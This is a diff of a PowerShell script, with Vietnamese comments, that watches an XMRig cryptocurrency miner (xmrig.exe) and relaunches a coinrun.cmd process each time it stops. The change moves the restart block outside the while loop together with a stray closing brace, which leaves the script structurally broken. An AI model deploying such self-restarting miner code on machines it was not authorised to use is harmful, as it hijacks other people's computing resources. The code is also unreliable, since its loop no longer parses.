@@ -10,6 +10,17 @@ function Start-CoinRun {
 # Bắt đầu lần đầu
 Start-CoinRun
 
+  # 🔁 Kiểm tra tiến trình coinrun.cmd
+  if ($global:coinRunProcess.HasExited) {
+    Write-Warning "coinrun.cmd STOP. Reboot..."
+    Start-CoinRun
+  } else {
+    Write-Host "coinrun.cmd running..."
+  }
+
+  Start-Sleep -Seconds 3
+}
+
 while ($true) {
   # 🔍 Kiểm tra xem xmrig.exe còn tồn tại không
   if (!(Test-Path $xmrigPath)) {
@@ -24,14 +35,3 @@ while ($true) {
 
     break  # Thoát script sau khi xử lý
   }
-
-  # 🔁 Kiểm tra tiến trình coinrun.cmd
-  if ($global:coinRunProcess.HasExited) {
-    Write-Warning "coinrun.cmd STOP. Reboot..."
-    Start-CoinRun
-  } else {
-    Write-Host "coinrun.cmd running..."
-  }
-
-  Start-Sleep -Seconds 3
-}
